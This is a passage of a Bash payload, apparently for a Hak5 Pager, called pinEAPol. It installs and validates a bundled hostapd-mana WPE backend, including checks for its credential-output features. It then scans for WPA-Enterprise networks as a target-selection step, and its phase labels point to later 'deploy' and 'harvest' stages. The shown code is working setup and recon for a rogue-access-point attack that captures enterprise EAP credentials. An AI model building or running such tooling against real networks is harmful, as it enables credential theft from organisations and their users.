        cleanup_duration=$((cleanup_end - START_TIME))
        echo "$((cleanup_duration / 60))m $((cleanup_duration % 60))s" > "$SESSION_DIR/duration.txt"
    fi

    release_runtime_lock
    LED WHITE
}

trap cleanup EXIT
trap 'exit 130' INT
trap 'exit 143' TERM
trap 'exit 129' HUP
trap 'exit 131' QUIT

check_for_stop() {
    local data=$(timeout 0.1 dd if=$INPUT bs=16 count=1 2>/dev/null | hexdump -e '16/1 "%02x "' 2>/dev/null)
    [ -z "$data" ] && return 1

    local evtype=$(echo "$data" | cut -d' ' -f9-10)
    local evvalue=$(echo "$data" | cut -d' ' -f13)

    if [ "$evtype" = "01 00" ] && [ "$evvalue" = "01" ]; then
        return 0
    fi
    return 1
}

# ============================================
# LED & SOUND
# ============================================

led_recon()   { LED CYAN; }
led_setup()   { LED AMBER; }
led_deploy()  { LED RED; }
led_harvest() { LED GREEN; }
led_error()   { LED MAGENTA; }

play_capture() {
    RINGTONE "cap:d=16,o=6,b=200:c,e,g,c7" &
}

play_complete() {
    RINGTONE "done:d=4,o=5,b=180:g,e,c,g4" &
}

play_fail() {
    RINGTONE "fail:d=4,o=4,b=120:g,e,c" &
}

# ============================================
# PHASE 0: DEPENDENCY CHECK
# ============================================

read_persistent_settings() {
    local settings_file="$PERSISTENT_CONFIG_DIR/pineapol.conf"

    if [ ! -f "$settings_file" ]; then
        write_persistent_settings
        return
    fi

    while IFS='=' read -r key value; do
        value=${value%$'\r'}
        case "$key" in
            HOSTAPD_UPDATE_POLICY) HOSTAPD_UPDATE_POLICY="$value" ;;
            HOSTAPD_UPDATE_INTERVAL_HOURS) HOSTAPD_UPDATE_INTERVAL_HOURS="$value" ;;
            HOSTAPD_KEEP_VERSIONS) HOSTAPD_KEEP_VERSIONS="$value" ;;
            CERT_PROFILE) CERT_PROFILE="$value" ;;
            CERT_CA_CN) CERT_CA_CN="$value" ;;
            CERT_CN) CERT_CN="$value" ;;
            CERT_ORG) CERT_ORG="$value" ;;
            CERT_OU) CERT_OU="$value" ;;
            CERT_COUNTRY) CERT_COUNTRY="$value" ;;
            CERT_STATE) CERT_STATE="$value" ;;
            CERT_LOCALITY) CERT_LOCALITY="$value" ;;
            CERT_DNS_SANS) CERT_DNS_SANS="$value" ;;
            CERT_IP_SANS) CERT_IP_SANS="$value" ;;
            CERT_DAYS) CERT_DAYS="$value" ;;
            CERT_KEY_BITS) CERT_KEY_BITS="$value" ;;
            CERT_RENEW_BEFORE_DAYS) CERT_RENEW_BEFORE_DAYS="$value" ;;
            EAP_PROFILE) EAP_PROFILE="$value" ;;
        esac
    done < "$settings_file"

    case "$HOSTAPD_UPDATE_POLICY" in ask|auto|never) ;; *) HOSTAPD_UPDATE_POLICY="ask" ;; esac
    case "$HOSTAPD_KEEP_VERSIONS" in ''|*[!0-9]*) HOSTAPD_KEEP_VERSIONS=2 ;; esac
    [ "$HOSTAPD_KEEP_VERSIONS" -lt 2 ] 2>/dev/null && HOSTAPD_KEEP_VERSIONS=2
}

write_persistent_settings() {
    local settings_file="$PERSISTENT_CONFIG_DIR/pineapol.conf"
    {
        echo "# pinEAPol settings - values are parsed, never sourced"
        echo "HOSTAPD_UPDATE_POLICY=$HOSTAPD_UPDATE_POLICY"
        echo "HOSTAPD_UPDATE_INTERVAL_HOURS=$HOSTAPD_UPDATE_INTERVAL_HOURS"
        echo "HOSTAPD_KEEP_VERSIONS=$HOSTAPD_KEEP_VERSIONS"
        echo "CERT_PROFILE=$CERT_PROFILE"
        echo "CERT_CA_CN=$CERT_CA_CN"
        echo "CERT_CN=$CERT_CN"
        echo "CERT_ORG=$CERT_ORG"
        echo "CERT_OU=$CERT_OU"
        echo "CERT_COUNTRY=$CERT_COUNTRY"
        echo "CERT_STATE=$CERT_STATE"
        echo "CERT_LOCALITY=$CERT_LOCALITY"
        echo "CERT_DNS_SANS=$CERT_DNS_SANS"
        echo "CERT_IP_SANS=$CERT_IP_SANS"
        echo "CERT_DAYS=$CERT_DAYS"
        echo "CERT_KEY_BITS=$CERT_KEY_BITS"
        echo "CERT_RENEW_BEFORE_DAYS=$CERT_RENEW_BEFORE_DAYS"
        echo "EAP_PROFILE=$EAP_PROFILE"
    } > "$settings_file"
    chmod 600 "$settings_file" 2>/dev/null
}

cached_hostapd_version() {
    sed -n 's/^package_version=//p' "$HOSTAPD_CACHE_DIR/current.manifest" 2>/dev/null | sed -n '1p'
}

refresh_package_lists_if_due() {
    [ "$HOSTAPD_UPDATE_POLICY" = "never" ] && return 1

    local now last_check interval
    now=$(date +%s)
    last_check=$(cat "$HOSTAPD_CACHE_DIR/last_update_check" 2>/dev/null)
    case "$last_check" in *[!0-9]*|'') last_check=0 ;; esac
    case "$HOSTAPD_UPDATE_INTERVAL_HOURS" in *[!0-9]*|'') HOSTAPD_UPDATE_INTERVAL_HOURS=24 ;; esac
    interval=$((HOSTAPD_UPDATE_INTERVAL_HOURS * 3600))

    if [ $((now - last_check)) -lt "$interval" ]; then
        return 1
    fi

    logboth blue "    - Checking OpenWrt package metadata..."
    if opkg update >/dev/null 2>&1; then
        echo "$now" > "$HOSTAPD_CACHE_DIR/last_update_check"
        return 0
    fi

    logboth yellow "    - Package metadata refresh failed; using cache"
    return 1
}

available_hostapd_package() {
    local package version

    for package in hostapd-openssl wpad-openssl; do
        version=$(opkg list "$package" 2>/dev/null | awk -v p="$package" '$1 == p { print $3; exit }')
        if [ -n "$version" ]; then
            printf '%s|%s\n' "$package" "$version"
            return 0
        fi
    done
    return 1
}

hostapd_update_available() {
    local cached="$1"
    local available="$2"

    [ -z "$available" ] && return 1
    [ -z "$cached" ] && return 0
    opkg compare-versions "$cached" lt "$available" >/dev/null 2>&1
}

prune_hostapd_cache() {
    local keep="$HOSTAPD_KEEP_VERSIONS"
    local current_target previous_target count=0 version_dir versions
    case "$keep" in ''|*[!0-9]*) keep=2 ;; esac
    [ "$keep" -lt 2 ] 2>/dev/null && keep=2

    current_target=$(readlink -f "$HOSTAPD_CACHE_DIR/current" 2>/dev/null)
    previous_target=$(readlink -f "$HOSTAPD_CACHE_DIR/previous" 2>/dev/null)
    versions=$(ls -dt "$HOSTAPD_CACHE_DIR"/hostapd-openssl-* \
        "$HOSTAPD_CACHE_DIR"/wpad-openssl-* 2>/dev/null)

    while IFS= read -r version_dir; do
        [ -d "$version_dir" ] || continue
        count=$((count + 1))
        [ "$count" -le "$keep" ] && continue
        [ "$version_dir" = "$current_target" ] && continue
        [ "$version_dir" = "$previous_target" ] && continue
        case "$version_dir" in
            "$HOSTAPD_CACHE_DIR"/hostapd-openssl-*|"$HOSTAPD_CACHE_DIR"/wpad-openssl-*)
                rm -rf "$version_dir"
                ;;
        esac
    done <<< "$versions"
}

install_cached_hostapd() {
    local package="$1"
    local package_version="$2"
    local download_dir="$SESSION_WORK_DIR/hostapd-download"
    local package_file data_archive extracted_binary version_slug destination previous_target package_arch
    local version_output version_status validation_log

    mkdir -p "$download_dir"
    cd "$download_dir" || return 1
    logboth blue "      - Downloading $package $package_version..."
    if ! opkg download "$package" >/dev/null 2>&1; then
        cd / || true
        logboth red "      - hostapd package download failed"
        return 1
    fi

    package_file=$(ls "$package"*.ipk 2>/dev/null | head -n 1)
    [ -z "$package_file" ] && { cd / || true; return 1; }
    package_arch=${package_file#"${package}_${package_version}_"}
    package_arch=${package_arch%.ipk}

    if ! tar xzf "$package_file" 2>/dev/null; then
        cd / || true
        logboth red "      - Could not unpack hostapd package"
        return 1
    fi

    data_archive=$(ls data.tar.* 2>/dev/null | head -n 1)
    [ -z "$data_archive" ] && { cd / || true; return 1; }
    case "$data_archive" in
        *.gz) tar xzf "$data_archive" 2>/dev/null ;;
        *) tar xf "$data_archive" 2>/dev/null ;;
    esac
    if [ $? -ne 0 ]; then
        cd / || true
        logboth red "      - Could not unpack hostapd package data"
        return 1
    fi

    extracted_binary="usr/sbin/hostapd"
    if [ ! -f "$extracted_binary" ] && [ -f "usr/sbin/wpad" ]; then
        # wpad is a multicall binary; give the cached copy a hostapd argv[0].
        cp "usr/sbin/wpad" "$download_dir/hostapd"
        extracted_binary="hostapd"
    fi
    if [ ! -f "$extracted_binary" ]; then
        cd / || true
        logboth red "      - hostapd binary absent from package"
        return 1
    fi

    chmod +x "$extracted_binary"
    validation_log="$SESSION_LOG_DIR/hostapd-candidate-validation.log"
    version_output=$("$download_dir/$extracted_binary" -v 2>&1)
    version_status=$?
    {
        echo "candidate=$download_dir/$extracted_binary"
        echo "package=$package"
        echo "package_version=$package_version"
        echo "architecture=$package_arch"
        echo "version_exit_status=$version_status"
        printf '%s\n' "$version_output"
        if command -v ldd >/dev/null 2>&1; then
            echo "--- ldd ---"
            ldd "$download_dir/$extracted_binary" 2>&1
        fi
    } > "$validation_log"

    # Upstream hostapd intentionally exits with status 1 after handling -v.
    # Treat recognizable version output as successful execution instead of
    # requiring a zero status from the version command.
    if ! is_hostapd_version_output "$version_output"; then
        cd / || true
        logboth red "      - Downloaded hostapd could not execute"
        [ -n "$version_output" ] && logboth red "      - $version_output"
        logboth yellow "      - Details: $validation_log"
        return 1
    fi

    if command -v ldd >/dev/null 2>&1 && ldd "$download_dir/$extracted_binary" 2>/dev/null | grep -q 'not found'; then
        cd / || true
        logboth red "      - Downloaded hostapd has missing libraries"
        return 1
    fi

    version_slug=$(safe_slug "$package_version")
    destination="$HOSTAPD_CACHE_DIR/${package}-${version_slug}"
    mkdir -p "$destination"
    cp "$extracted_binary" "$destination/hostapd" || { cd / || true; return 1; }
    chmod 700 "$destination/hostapd"

    {
        echo "package=$package"
        echo "package_version=$package_version"
        echo "architecture=$package_arch"
        echo "binary_version=$("$destination/hostapd" -v 2>&1 | sed -n '1p')"
        echo "downloaded_at=$(date '+%Y-%m-%dT%H:%M:%S%z')"
        if command -v sha256sum >/dev/null 2>&1; then
            echo "sha256=$(sha256sum "$destination/hostapd" | awk '{print $1}')"
        else
            echo "sha256=$(openssl dgst -sha256 "$destination/hostapd" 2>/dev/null | sed 's/.*= //')"
        fi
    } > "$destination/manifest"

    previous_target=$(readlink -f "$HOSTAPD_CACHE_DIR/current" 2>/dev/null)
    if [ -n "$previous_target" ] && [ -x "$previous_target/hostapd" ] && \
       [ "$previous_target" != "$destination" ]; then
        ln -sfn "$previous_target" "$HOSTAPD_CACHE_DIR/previous"
    fi
    ln -sfn "$destination" "$HOSTAPD_CACHE_DIR/current"
    cp "$destination/manifest" "$HOSTAPD_CACHE_DIR/current.manifest"
    HOSTAPD_BIN="$HOSTAPD_CACHE_DIR/current/hostapd"
    prune_hostapd_cache
    cd / || true
    logboth green "      - Cached hostapd $package_version ready"
    return 0
}

calculate_sha256() {
    local path="$1"
    if command -v sha256sum >/dev/null 2>&1; then
        sha256sum "$path" 2>/dev/null | awk '{print $1}'
    else
        openssl dgst -sha256 "$path" 2>/dev/null | sed 's/.*= //'
    fi
}

is_hostapd_version_output() {
    printf '%s\n' "$1" |
        grep -Eq '(^|[[:space:]])hostapd(-mana)? v?[0-9]'
}

validate_mana_binary() {
    local candidate="$1"
    local validation_log="$2"
    local actual_sha version_output version_status=0

    [ -f "$candidate" ] && [ -x "$candidate" ] || return 1
    actual_sha=$(calculate_sha256 "$candidate")
    version_output=$("$candidate" -v 2>&1) || version_status=$?

    {
        echo "candidate=$candidate"
        echo "expected_sha256=$MANA_EXPECTED_SHA256"
        echo "actual_sha256=$actual_sha"
        echo "version_exit_status=$version_status"
        printf '%s\n' "$version_output"
        if command -v ldd >/dev/null 2>&1; then
            echo "--- ldd ---"
            ldd "$candidate" 2>&1
        fi
    } > "$validation_log"

    [ "$actual_sha" = "$MANA_EXPECTED_SHA256" ] || return 1
    is_hostapd_version_output "$version_output" || return 1
    LC_ALL=C grep -q 'mana_wpe' "$candidate" 2>/dev/null || return 1
    LC_ALL=C grep -q 'mana_credout' "$candidate" 2>/dev/null || return 1
    if command -v ldd >/dev/null 2>&1 && \
       ldd "$candidate" 2>&1 | grep -Eq 'not found|Error loading shared library|No such file'; then
        return 1
    fi
    return 0
}

install_bundled_mana() {
    local destination="$HOSTAPD_CACHE_DIR/mana-$MANA_BUILD_ID"
    local candidate="$destination/hostapd"
    local validation_log="$SESSION_LOG_DIR/hostapd-mana-validation.log"

    mkdir -p "$destination" || return 1

    # A validated persistent copy does not depend on the UI's launch path. This
    # also lets the payload keep working if its source folder is later moved.
    if [ -f "$candidate" ] && \
       [ "$(calculate_sha256 "$candidate")" = "$MANA_EXPECTED_SHA256" ] && \
       validate_mana_binary "$candidate" "$validation_log"; then
        :
    else
        if [ ! -f "$MANA_BUNDLED_BIN" ]; then
            logboth red "    - Bundled hostapd-mana binary is missing"
            logboth yellow "    - Resolved payload folder: $PAYLOAD_DIR"
            logboth yellow "    - Expected: $MANA_BUNDLED_BIN"
            logboth yellow "    - Copy the complete payload folder, including bin/"
            return 1
        fi

        logboth blue "    - Installing bundled hostapd-mana backend..."
        cp "$MANA_BUNDLED_BIN" "$candidate.new" || return 1
        chmod 700 "$candidate.new"
        if ! validate_mana_binary "$candidate.new" "$validation_log"; then
            rm -f "$candidate.new"
            logboth red "    - Bundled hostapd-mana validation failed"
            logboth yellow "    - Details: $validation_log"
            return 1
        fi
        mv "$candidate.new" "$candidate" || return 1
    fi

    {
        echo "backend=hostapd-mana"
        echo "source_commit=$MANA_BUILD_ID"
        echo "sha256=$MANA_EXPECTED_SHA256"
        echo "architecture=mipsel_24kc"
        echo "binary_version=$("$candidate" -v 2>&1 | sed -n '1p')"
        echo "installed_at=$(date '+%Y-%m-%dT%H:%M:%S%z')"
        [ -f "$MANA_BUNDLED_BUILDINFO" ] && sed 's/^/build_/' "$MANA_BUNDLED_BUILDINFO"
    } > "$destination/manifest"
    chmod 600 "$destination/manifest" 2>/dev/null

    ln -sfn "$destination" "$HOSTAPD_CACHE_DIR/mana-current"
    cp "$destination/manifest" "$HOSTAPD_CACHE_DIR/mana-current.manifest"
    HOSTAPD_BIN="$HOSTAPD_CACHE_DIR/mana-current/hostapd"
    return 0
}

select_hostapd_binary() {
    logboth "  - Checking bundled hostapd-mana backend..."
    install_bundled_mana || return 1
    logboth green "    - hostapd-mana WPE backend ready"
    return 0
}

check_deps() {
    local missing=0

    if [ -z "${BASH_VERSION:-}" ]; then
        logboth red "  - Bash is required by this payload"
        return 1
    fi
    logboth green "  - Bash ${BASH_VERSION%%(*}"

    logboth "  - Checking for openssl..."
    if ! command -v openssl >/dev/null 2>&1; then
        logboth red "    - openssl not found"
        missing=1
    else
        logboth green "    - openssl found"
    fi

    logboth "  - Checking for iw..."
    if ! command -v iw >/dev/null 2>&1; then
        logboth red "    - iw not found"
        missing=1
    else
        logboth green "    - iw found"
    fi

    logboth "  - Checking for iwinfo..."
    if ! command -v iwinfo >/dev/null 2>&1; then
        logboth red "    - iwinfo not found"
        missing=1
    else
        logboth green "    - iwinfo found"
    fi

    logboth "  - Checking for ifconfig..."
    if ! command -v ifconfig >/dev/null 2>&1; then
        logboth red "    - ifconfig not found"
        missing=1
    else
        logboth green "    - ifconfig found"
    fi

    logboth "  - Checking for hostapd_cli..."
    if ! command -v hostapd_cli >/dev/null 2>&1; then
        logboth red "    - hostapd_cli not found"
        missing=1
    else
        logboth green "    - hostapd_cli found"
    fi

    logboth "  - Checking for tcpdump..."
    if ! command -v tcpdump >/dev/null 2>&1; then
        logboth yellow "    - tcpdump not found (optional)"
    else
        logboth green "    - tcpdump found"
    fi

    if [ "$missing" -eq 1 ]; then
        resp=$(CONFIRMATION_DIALOG "Missing dependencies.
Attempt auto-install?")
        case $? in
            $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
                return 1
                ;;
        esac

        if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
            local sid=$(START_SPINNER "Installing packages...")
            logboth "  - Updating opkg..."
            opkg update >/dev/null 2>&1
            logboth "  - Installing openssl-util, iw, iwinfo, ifconfig, hostapd-utils, and tcpdump..."
            opkg install openssl-util iw iwinfo net-tools-ifconfig hostapd-utils tcpdump >/dev/null 2>&1
            STOP_SPINNER $sid

            logboth "  - Verifying installation..."
            if ! command -v openssl >/dev/null 2>&1; then
                logboth red "    - openssl install failed"
                ERROR_DIALOG "openssl install failed"
                return 1
            else
                logboth green "    - openssl installed"
            fi
            if ! command -v iw >/dev/null 2>&1; then
                logboth red "    - iw install failed"
                ERROR_DIALOG "iw install failed

Run manually:
opkg install iw"
                return 1
            else
                logboth green "    - iw installed"
            fi
            if ! command -v iwinfo >/dev/null 2>&1; then
                logboth red "    - iwinfo install failed"
                ERROR_DIALOG "iwinfo install failed

Run manually:
opkg install iwinfo"
                return 1
            else
                logboth green "    - iwinfo installed"
            fi
            if ! command -v ifconfig >/dev/null 2>&1; then
                logboth red "    - ifconfig install failed"
                ERROR_DIALOG "ifconfig install failed

Run manually:
opkg install net-tools-ifconfig"
                return 1
            else
                logboth green "    - ifconfig installed"
            fi
            if ! command -v hostapd_cli >/dev/null 2>&1; then
                logboth red "    - hostapd_cli install failed"
                ERROR_DIALOG "hostapd_cli install failed

Run manually:
opkg install hostapd-utils"
                return 1
            else
                logboth green "    - hostapd_cli installed"
            fi
            LOG green "Packages installed"
        else
            return 1
        fi
    fi

    select_hostapd_binary || return 1

    if ! command -v "$HOSTAPD_BIN" >/dev/null 2>&1; then
        logboth red "    - hostapd binary is not executable: $HOSTAPD_BIN"
        return 1
    fi

    local hostapd_version
    hostapd_version=$("$HOSTAPD_BIN" -v 2>&1 | sed -n '1p')
    logboth blue "    - hostapd binary: $HOSTAPD_BIN"
    if [ -n "$hostapd_version" ]; then
        logboth blue "    - hostapd version: $hostapd_version"
    else
        logboth yellow "    - hostapd version unavailable"
    fi

    logboth green "Dependencies OK"
    return 0
}

# ============================================
# PHASE 1: RECON
# ============================================

#
# pinEAPol intentionally scans only on the Pager's multi-band radio.
#
# phy0 is not used as a fallback because doing so could silently hide
# 5 GHz / 6 GHz enterprise networks from the user.
#
SCAN_PHY="${PINEAPOL_SCAN_PHY:-phy1}"
SCAN_TEMP_IFACE="${PINEAPOL_SCAN_IFACE:-wlan1scan}"
SCAN_TEMP_CREATED=0
SCAN_INTERFACE=""
SCAN_BANDS="unknown"
SCAN_RAW_FILE=""

# One entry per BSSID.
declare -a ENTERPRISE_SSIDS
declare -a ENTERPRISE_BSSIDS
declare -a ENTERPRISE_CHANNELS
declare -a ENTERPRISE_SIGNALS
declare -a ENTERPRISE_ENCRYPTIONS

# One entry per unique SSID, derived from the BSSID-level arrays.
declare -a ENTERPRISE_UNIQUE_SSIDS
declare -a ENTERPRISE_UNIQUE_SIGNALS
declare -a ENTERPRISE_UNIQUE_COUNTS

ENTERPRISE_COUNT=0
ENTERPRISE_UNIQUE_COUNT=0


reset_enterprise_scan_results() {
    ENTERPRISE_SSIDS=()
    ENTERPRISE_BSSIDS=()
    ENTERPRISE_CHANNELS=()
    ENTERPRISE_SIGNALS=()
    ENTERPRISE_ENCRYPTIONS=()

    ENTERPRISE_UNIQUE_SSIDS=()
    ENTERPRISE_UNIQUE_SIGNALS=()
    ENTERPRISE_UNIQUE_COUNTS=()

    ENTERPRISE_COUNT=0
    ENTERPRISE_UNIQUE_COUNT=0
}


# Return the PHY name for an interface, for example:
#
#     wlan1mon -> phy1
#
interface_phy() {
    local iface="$1"
    local wiphy

    wiphy=$(iw dev "$iface" info 2>/dev/null |
        awk '$1 == "wiphy" { print $2; exit }')

    case "$wiphy" in
        ''|*[!0-9]*)
            return 1
            ;;
    esac

    printf 'phy%s' "$wiphy"
}


#
# Produce a short human-readable summary of the frequency ranges exposed
# by the selected PHY.
#
# The Pager's iw output reports frequencies as e.g. "2412.0 MHz", so strip
# the decimal portion before performing integer comparisons.
#
detect_phy_bands() {
    local phy="$1"
    local frequencies
    local have_2=0
    local have_5=0
    local have_6=0
    local freq
    local result=""

    frequencies=$(
        iw phy "$phy" info 2>/dev/null |
            awk '
                $1 == "*" && $3 == "MHz" {
                    freq = $2
                    sub(/\..*/, "", freq)
                    print freq
                }
            '
    )

    while IFS= read -r freq; do
        case "$freq" in
            ''|*[!0-9]*)
                continue
                ;;
        esac

        if [ "$freq" -ge 2400 ] && [ "$freq" -lt 2500 ]; then
            have_2=1

        elif [ "$freq" -ge 4900 ] && [ "$freq" -lt 5925 ]; then
            have_5=1

        elif [ "$freq" -ge 5925 ] && [ "$freq" -le 7125 ]; then
            have_6=1
        fi
    done <<< "$frequencies"

    [ "$have_2" -eq 1 ] && result="2.4GHz"

    if [ "$have_5" -eq 1 ]; then
        [ -n "$result" ] && result="$result / "
        result="${result}5GHz"
    fi

    if [ "$have_6" -eq 1 ]; then
        [ -n "$result" ] && result="$result / "
        result="${result}6GHz"
    fi

    [ -n "$result" ] || result="unknown"

    printf '%s' "$result"
}


#
# Remove the temporary managed interface used for active scanning.
#
# Only the explicitly reserved scan interface is touched. wlan1mon is never
# modified or deleted here.
#
remove_scan_interface() {
    local iface="${SCAN_TEMP_IFACE:-wlan1scan}"
    local phy
    local iface_type

    #
    # Only remove an interface created by this payload instance.
    #
    # This prevents cleanup from deleting an unrelated pre-existing
    # managed interface that happens to use the same name.
    #
    if [ "$SCAN_TEMP_CREATED" -ne 1 ]; then
        return 0
    fi

    if ! iw dev "$iface" info >/dev/null 2>&1; then
        SCAN_TEMP_CREATED=0
        return 0
    fi

    phy=$(interface_phy "$iface" 2>/dev/null)
    iface_type=$(
        iw dev "$iface" info 2>/dev/null |
            awk '$1 == "type" { print $2; exit }'
    )

    #
    # Refuse to remove an interface with our reserved name if it isn't the
    # managed phy1 interface we expect.
    #
    if [ "$phy" != "$SCAN_PHY" ] || [ "$iface_type" != "managed" ]; then
        logboth yellow \
            "Refusing to remove unexpected interface $iface (phy=${phy:-unknown}, type=${iface_type:-unknown})"
        return 1
    fi

    if command -v ifconfig >/dev/null 2>&1; then
        ifconfig "$iface" down 2>/dev/null || true
    elif command -v ip >/dev/null 2>&1; then
        ip link set "$iface" down 2>/dev/null || true
    fi

    iw dev "$iface" del 2>/dev/null || {
        logboth yellow "Could not remove temporary scan interface $iface"
        return 1
    }

    SCAN_TEMP_CREATED=0
    return 0
}


#
# Create a temporary managed interface on the Pager's multi-band PHY.
#
# iwinfo requires a managed interface for active scanning on this radio;
# wlan1mon is a monitor interface and reports "Scanning not possible".
#
prepare_scan_interface() {
    local iface="$SCAN_TEMP_IFACE"
    local existing_phy
    local existing_type
    local created_phy
    local created_type

    #
    # If wlan1scan was left behind by an interrupted run or manual test,
    # validate it before removing it.
    #
    if iw dev "$iface" info >/dev/null 2>&1; then
        existing_phy=$(interface_phy "$iface" 2>/dev/null)
        existing_type=$(
            iw dev "$iface" info 2>/dev/null |
                awk '$1 == "type" { print $2; exit }'
        )

        if [ "$existing_phy" != "$SCAN_PHY" ] || \
           [ "$existing_type" != "managed" ]; then

            logboth red \
                "$iface already exists with unexpected configuration"
            logboth red \
                "Interface: phy=${existing_phy:-unknown} type=${existing_type:-unknown}"

            return 1
        fi

        logboth red \
            "$iface already exists on $SCAN_PHY"

        logboth yellow \
            "Refusing to replace a pre-existing managed interface"

        return 1
    fi

    logboth blue \
        "Creating managed scan interface $iface on $SCAN_PHY"

    if ! iw phy "$SCAN_PHY" interface add "$iface" type managed \
        2>> "$SESSION_LOG_DIR/scan-errors.log"; then

        logboth red \
            "Could not create managed scan interface on $SCAN_PHY"
        return 1
    fi

    SCAN_TEMP_CREATED=1

    if command -v ifconfig >/dev/null 2>&1; then
        if ! ifconfig "$iface" up \
            2>> "$SESSION_LOG_DIR/scan-errors.log"; then

            logboth red "Could not bring $iface up"
            remove_scan_interface
            return 1
        fi

    elif command -v ip >/dev/null 2>&1; then
        if ! ip link set "$iface" up \
            2>> "$SESSION_LOG_DIR/scan-errors.log"; then

            logboth red "Could not bring $iface up"
            remove_scan_interface
            return 1
        fi
    else
        logboth red \
            "Neither ifconfig nor ip is available to bring $iface up"

        remove_scan_interface
        return 1
    fi

    #
    # Give mac80211/driver a moment to initialise the new VIF before iwinfo
    # requests a scan.
    #
    sleep 1

    created_phy=$(interface_phy "$iface" 2>/dev/null)
    created_type=$(
        iw dev "$iface" info 2>/dev/null |
            awk '$1 == "type" { print $2; exit }'
    )

    if [ "$created_phy" != "$SCAN_PHY" ] || \
       [ "$created_type" != "managed" ]; then

        logboth red \
            "Temporary scan interface validation failed"

        logboth red \
            "Interface: $iface phy=${created_phy:-unknown} type=${created_type:-unknown}"

        remove_scan_interface
        return 1
    fi

    logboth green \
        "Scan interface ready: $iface ($created_phy, $created_type)"

    return 0
}


#
# Perform an active multi-band scan using a temporary managed interface
# attached to phy1.
#
perform_multiband_scan() {
    local scan_file
    local scan_status
    local cells=0

    SCAN_INTERFACE=""
    SCAN_RAW_FILE=""
    SCAN_BANDS=$(detect_phy_bands "$SCAN_PHY")

    logboth blue "Recon radio: $SCAN_PHY"
    logboth blue "Recon bands: $SCAN_BANDS"

    #
    # Confirm the target PHY actually exists before attempting to create
    # an interface on it.
    #
    if ! iw phy "$SCAN_PHY" info >/dev/null 2>&1; then
        logboth red "Multi-band radio not found: $SCAN_PHY"
        return 1
    fi

    if ! prepare_scan_interface; then
        logboth red "Unable to prepare multi-band scan interface"
        return 1
    fi

    SCAN_INTERFACE="$SCAN_TEMP_IFACE"
    scan_file="$SESSION_WORK_DIR/iwinfo-${SCAN_INTERFACE}-scan.txt"
    SCAN_RAW_FILE="$scan_file"

    logboth blue \
        "Starting WiFi scan on $SCAN_INTERFACE ($SCAN_PHY)"

    #
    # Keep the complete iwinfo output. This is useful for debugging parsing
    # problems and lets the interface be deleted immediately after scanning.
    #
    iwinfo "$SCAN_INTERFACE" scan > "$scan_file" \
        2>> "$SESSION_LOG_DIR/scan-errors.log"

    scan_status=$?

    #
    # Some iwinfo builds print errors such as "Scanning not possible" to
    # stdout while still returning a successful exit status. Explicitly
    # reject those responses.
    #
    if grep -qiE \
        'Scanning not possible|No such wireless device|Interface .* not found|Operation not supported|Device or resource busy' \
        "$scan_file" 2>/dev/null; then

        logboth red \
            "iwinfo reported that scanning is unavailable on $SCAN_INTERFACE"

        while IFS= read -r line; do
            [ -n "$line" ] && \
                logboth yellow "iwinfo: $line"
        done < "$scan_file"

        remove_scan_interface
        return 1
    fi

    if [ "$scan_status" -ne 0 ]; then
        logboth red \
            "iwinfo scan failed on $SCAN_INTERFACE (status $scan_status)"

        remove_scan_interface
        return 1
    fi

    cells=$(
        grep -cE \
            '^[[:space:]]*Cell[[:space:]]+[0-9]+[[:space:]]*-[[:space:]]*Address:' \
            "$scan_file" 2>/dev/null
    )

    case "$cells" in
        ''|*[!0-9]*)
            cells=0
            ;;
    esac

    logboth blue \
        "WiFi scan completed: $cells BSS entries"

    #
    # The raw scan has already been saved, so the managed scan VIF is no
    # longer required. Leave wlan1mon completely untouched.
    #
    remove_scan_interface

    if [ "$cells" -eq 0 ]; then
        logboth yellow \
            "WiFi scan completed successfully but found no BSS entries"

        return 0
    fi

    logboth green \
        "WiFi scan captured $cells BSS entries on $SCAN_PHY"

    return 0
}


normalize_enterprise_encryption() {
    local description

    description=$(printf '%s' "$1" |
        tr '[:lower:]' '[:upper:]')

    case "$description" in
        *ENTERPRISE*|*802.1X*|*8021X*|*EAP*)
            return 0
            ;;
    esac

    return 1
}


#
# Add one BSSID-level Enterprise record.
#
# Invalid or incomplete records are discarded instead of filling them with
# fake defaults such as channel 6 / -99 dBm.
#
add_enterprise_scan_record() {
    local ssid="$1"
    local bssid="$2"
    local channel="$3"
    local signal="$4"
    local encryption="$5"
    local i

    [ -n "$ssid" ] || return 0
    [ -n "$bssid" ] || return 0

    case "$ssid" in
        [Uu][Nn][Kk][Nn][Oo][Ww][Nn])
            return 0
            ;;
    esac

    normalize_enterprise_encryption "$encryption" || return 0

    case "$channel" in
        ''|*[!0-9]*)
            return 0
            ;;
    esac

    case "$signal" in
        -[0-9]*|[0-9]*)
            ;;
        *)
            return 0
            ;;
    esac

    #
    # Ensure this exact BSSID only appears once.
    #
    for ((i = 0; i < ${#ENTERPRISE_BSSIDS[@]}; i++)); do
        if [ "${ENTERPRISE_BSSIDS[$i]}" = "$bssid" ]; then
            #
            # If the same BSSID appeared more than once, retain the
            # strongest observation.
            #
            if [ "$signal" -gt "${ENTERPRISE_SIGNALS[$i]}" ] 2>/dev/null; then
                ENTERPRISE_SSIDS[$i]="$ssid"
                ENTERPRISE_CHANNELS[$i]="$channel"
                ENTERPRISE_SIGNALS[$i]="$signal"
                ENTERPRISE_ENCRYPTIONS[$i]="$encryption"
            fi

            return 0
        fi
    done

    ENTERPRISE_SSIDS+=("$ssid")
    ENTERPRISE_BSSIDS+=("$bssid")
    ENTERPRISE_CHANNELS+=("$channel")
    ENTERPRISE_SIGNALS+=("$signal")
    ENTERPRISE_ENCRYPTIONS+=("$encryption")
}


#
# Parse iwinfo output one Cell at a time.
#
# This follows the more robust approach used by Hak5's AP-Client-GUI rather
# than splitting AWK output through a here-string.
#
parse_enterprise_scan_results() {
    local line
    local in_cell=0

    local ssid=""
    local bssid=""
    local channel=""
    local signal=""
    local encryption=""

    local raw
    local new_bssid

    reset_enterprise_scan_results

    [ -n "$SCAN_RAW_FILE" ] || return 1
    [ -f "$SCAN_RAW_FILE" ] || return 1

    while IFS= read -r line || [ -n "$line" ]; do
        line=${line%$'\r'}

        if [[ "$line" =~ ^[[:space:]]*Cell[[:space:]]+[0-9]+[[:space:]]*-[[:space:]]*Address:[[:space:]]*(.*)$ ]]; then
            new_bssid="${BASH_REMATCH[1]}"

            if [ "$in_cell" -eq 1 ]; then
                add_enterprise_scan_record \
                    "$ssid" \
                    "$bssid" \
                    "$channel" \
                    "$signal" \
                    "$encryption"
            fi

            in_cell=1
